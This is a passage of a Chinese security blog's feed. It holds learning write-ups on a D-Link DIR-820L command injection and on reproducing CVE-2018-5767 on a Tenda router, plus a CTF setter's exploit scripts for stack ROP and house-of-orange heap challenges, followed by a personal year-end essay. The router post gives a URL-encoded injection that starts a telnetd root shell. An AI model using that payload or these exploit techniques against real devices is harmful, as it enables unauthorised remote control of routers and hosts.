    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>设备型号:D-Link DIR-820L<br>固件下载地址:<a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663">http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接直接选择使用Firmae进行模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR ./DIR820LA1_FW105B03.bin</span><br></pre></td></tr></table></figure><p>第一次使用Firmae可能需要等的比较久 我等了二十分钟左右<br>出现下图中的样子就是启动成功了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据提供的描述 可以得知漏洞出现在lan.asp中的device_name</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D-Link DIR-820L 1.05B03 was discovered to contain a remote command execution (RCE) vulnerability via the Device Name parameter in /lan.asp.</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" alt="image.png"></a><br>可以看到这个参数拼接到了paremStr中 作为copyDataToDataModelFormat函数的返回值<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" alt="image.png"></a><br>朔源一下这个函数 推测出来请求的目标网址应该是get_set.ccp<br>在squashfs-root文件夹中查询一下这个字符串<br>没有找到这个文件名 应该是放到了后端处理 但是出现了四个使用到的二进制文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" alt="image.png"></a><br>这里复制了这篇文章的描述: <a href="https://www.wangan.com/p/11v772975e2a5820">https://www.wangan.com/p/11v772975e2a5820</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">◆bin/smbd 程序是 Samba 服务器的一部分，它允许路由器用户与 Windows 客户端共享文件和打印机。Samba 服务器是一个开源软件，它实现了 SMB/CIFS 协议，这是 Windows 操作系统使用的文件和打印机共享协议。bin/smbd 程序是 Samba 服务器的核心组件之一，它提供了文件和打印机共享的功能。</span><br><span class="line"></span><br><span class="line">◆bin/flash 程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。</span><br><span class="line"></span><br><span class="line">◆sbin/ncc2 程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过 ncc2 程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。</span><br><span class="line"></span><br><span class="line">◆lib/libapmib.so 是 D-Link 路由器系统中的一个库文件，它包含了许多重要的 API 和函数，用于实现路由器的各种功能。用户可以通过调用这些 API 和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。</span><br></pre></td></tr></table></figure><p>所以这里我们选择ncc2这个程序 ida打开<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" alt="image.png"></a><br>调用了hasInjectionString函数来判断是否存在注入字符串 这里需要查找一下过滤了哪些内容<br>查找一下这个函数是在哪个动态库声明的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" alt="image.png"></a><br>最后成功找到了过滤的字符串<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" alt="image.png"></a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>直接在管理界面修改device_name 随后点击保存 利用burp抓包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" alt="image.png"></a><br>可以看到修改的应该是这个参数 这里选择使用telnetd来创建一个远程会话连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a</span><br></pre></td></tr></table></figure><p>%0a用来绕过字符判断<br>在7080端口建立一个&#x2F;bin&#x2F;sh的会话 等下直接nc这个端口就行了<br>可惜我自己试了半天都没有复现成功 不过学习个思路就行了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果要换我来挖掘漏洞的话 我认为应该是先批量查找调用了system函数的二进制文件 找到ncc2以后 再根据其拼接参数的来源去进一步找到device_name </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>cve-2018-5767</title>
    <link href="http://example.com/2023/09/15/cve-2018-5767/"/>
    <id>http://example.com/2023/09/15/cve-2018-5767/</id>
    <published>2023-09-15T03:03:19.000Z</published>
    <updated>2023-09-17T07:45:19.463Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一款arm架构的路由器 主要的漏洞位于httpd中 cookie可以产生栈溢出 同时httpd开启的保护很少 比较适合新手用于arm架构的学习<br>固件下载地址 <a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1</a></p><h1 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h1><p>使用binwalk提取出固件的文件系统<br>随后使用readelf查看一下固件的架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" alt="image.png"></a><br>可以看到是32位的ARM架构<br>接下来如果我们直接使用qemu-arm-static来启动httpd的话 会提示缺失库文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" alt="image.png"></a><br>我们需要把qemu-arm-static的文件拷贝到当前目录 随后利用chroot将当前目录作为根目录 随后再重新启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp /usr/bin/qemu-arm-static .</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" alt="image.png"></a><br>但是你会发现此时程序卡在了这里<br>先利用ida打开httpd 在字符串中搜索Welcome to 很快就定位了具体的位置<br>可以看到对于v18的值进行了检查 如果小于等于0就陷入死循环<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" alt="image.png"></a><br>将断点打在这个puts函数 我们看看v18的值是怎么赋值的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">b *0x2CF7C</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>可以看到此时的死循环和R3寄存器的值有关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" alt="image.png"></a><br>我们需要利用keypatch更改mvn这一条指令 使得r3的值大于0后可以绕过死循环<br>但是可以看到此时虽然跳过了while的死循环 但是程序输出错误后就直接结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" alt="image.png"></a><br>还是老办法 定位到对应的字符串<br>代码审计可以发现是这个if判断的锅<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" alt="image.png"></a><br>我们需要进入这个if分支 才能正常使用程序<br>则使得r3不为0即可<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" alt="image.png"></a><br>随后又迎来了一个问题 可以看到虽然此时httpd已经成功启动 但是其获取到的ip地址明显不对 所以我们需要一个网桥接口来使得可以正常获取ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo ifconfig br0 192.168.xx.xx</span><br></pre></td></tr></table></figure><p>随后我们再次运行httpd程序 可以发现成功获取到了ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" alt="image.png"></a><br>暂时挂起这个进程 我们ping这个地址如果可以ping通就成功了<br>但是还是发现无法正常访问网页<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/`</span><br></pre></td></tr></table></figure><p>把目录复制一下就行了 原理暂时还没搞懂<br>这个师傅的文章看到的 <a href="https://cn-sec.com/archives/1727127.html">https://cn-sec.com/archives/1727127.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过官方给出的分析<br><a href="https://fidusinfosec.com/remote-code-execution-cve-2018-5767/">https://fidusinfosec.com/remote-code-execution-cve-2018-5767/</a><br>可以知道漏洞点位于R7WebsSecurityHandler函数中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" alt="image.png"></a><br>调用了sscanf函数把cookie中的password参数传入到了栈上 而httpd文件就开启了一个NX<br>所以可以进行一个栈溢出的rop链利用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" alt="image.png"></a><br>看其他师傅是可以使用python脚本来发送请求的 但是不知道为啥我不行 所以这里采用bp来发包 （第二天补的这句话 发现是我的终端加了http和https的代理<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" alt="image.png"></a><br>随后可以看到程序终止了 报段错误<br>于是使用gdb-multiarch来进行动态调试 寻找触发段错误的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" alt="image.png"></a><br>可以看到程序卡在了这里 由于r3寄存器被我们填入的垃圾数据覆盖<br>而ldrb需要访问r3寄存器存储的内存地址中的数据 所以这里产生了非法的内存访问 从而导致了段错误<br>通过backtrace指令 可以看到此指令是由0x2c5cc触发的 在ida中寻找一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" alt="image.png"></a><br>在if分支中有一个函数涉及到了该地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" alt="image.png"></a><br>所以我们要做的就是跳过if分支 这样才可以执行到我们控制的rop链<br>绕过if分支的条件则是在’.’后跟上这些后缀名<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" alt="image.png"></a><br>随后就是简单的栈溢出 直接打system就行了<br>但是 由于我的vmmap不知道为啥获取不到对应的libc地址<br>所以复现失败</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>Sictf_round2出题小记</title>
    <link href="http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
    <id>http://example.com/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-09-11T04:43:02.000Z</published>
    <updated>2023-09-14T17:21:11.120Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>被非预期打穿了呜呜呜  应该清空一下栈的内容 或者加个内联汇编修改一下rdx寄存器的值</p><p>原本的做法是劫持rbp寄存器 修改rsi寄存器 随后就可以利用write函数泄露bss段上的libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.arch = &quot;i386&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.0.104&quot;,32770)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!!!&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0x404040</span></span><br><span class="line">write_addr = <span class="number">0x4011E2</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0xa00</span>)</span><br><span class="line">ptr_addr = <span class="number">0x4011F1</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(leak_addr+<span class="number">0x20</span>+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p64(bss_addr)+p64(write_addr)+cyclic(<span class="number">0x10</span>)+p64(leak_addr+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(p8(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a780</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>house of orange 不过对泄露堆地址的步骤改了改</p><p>没开PIE 这样可以用unsortedbin attack往存放堆块指针的地址写入堆地址 就可以泄露堆地址了</p><p>然后要明白unsortedbin attack为什么使用过一次后 再次进行堆块操作就会报错 是因为破坏了main_arena以及fd bk域 修复一下就可以再次进行unsortedbin attack了 随后就是house of orange的部分了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;210.44.151.51&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xfc1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5131</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040E0</span>+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x22010</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x22010</span>)+p64(heap_addr+<span class="number">0x90</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">main_arena = libc_addr + <span class="number">0x3c4b20</span>+<span class="number">88</span></span><br><span class="line">payload = cyclic(<span class="number">0x48</span>)+p64(<span class="number">0xf51</span>)+p64(main_arena)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">IO_list_all = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x1a8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># debug()</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>大一总结</title>
    <link href="http://example.com/2023/08/24/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/08/24/%E5%A4%A7%E4%B8%80%E6%80%BB%E7%BB%93/</id>
    <published>2023-08-24T15:18:00.000Z</published>
    <updated>2023-09-14T17:17:50.334Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>岁月匆匆 一转眼的瞬间 大一就要结束了 回顾去年的所作所为 有满意的地方也有不尽人意的 时至今日 也无法改变什么了 很喜欢漂流少年的一句台词 就以这句台词来开启本篇总结吧</p><p><strong>人生就是一场无尽的徒劳 但是 正是因为毫无意义 我才会觉得活着的这个瞬间 这份辉煌很可贵 因为这是此时此刻 只属于我的东西</strong></p><h2 id="为什么打CTF"><a href="#为什么打CTF" class="headerlink" title="为什么打CTF"></a>为什么打CTF</h2><p>这个问题或许解释成 为什么想打竞赛比较好 在高考结束后的那个暑假 我第一次对于人生有了看法 考上好大学是为了什么? 老师父母都会跟我说这是对自己的人生负责 为了过上好日子 所以好大学&#x3D;好人生？为了找到这个问题的答案 我喜欢骑着自行车穿梭在城市的各个角落 这也是现在公路车这个爱好的起源 看那些不同阶级的人 一天中的不同时间 不同地方 能看到不同的人生</p><p>依稀记得是七月份的某天凌晨 实在是睡不着 于是说决定去骑车看看这座城市早上的样子吧 最开始看到的是三四点骑着三轮载着菜赶往早市的大妈  晚些时候 路过了建筑工地 看到的是扛起了整个家庭的父亲 找了一家靠近工地的早餐店 看着来来往往的工人和早班的白领 第一次对于人生有了比较大的感悟 这是以前在学校的环境中所体会不到的 对于<strong>钱</strong>这一概念 更加深刻了 </p><p>后来 高考成绩出了 意外的收获了最好的一次 不过最后也还是来了福建师范大学 要说满意呢 其实也没有 一直以来都在给自己一个借口 我只不过是学的时间比较短 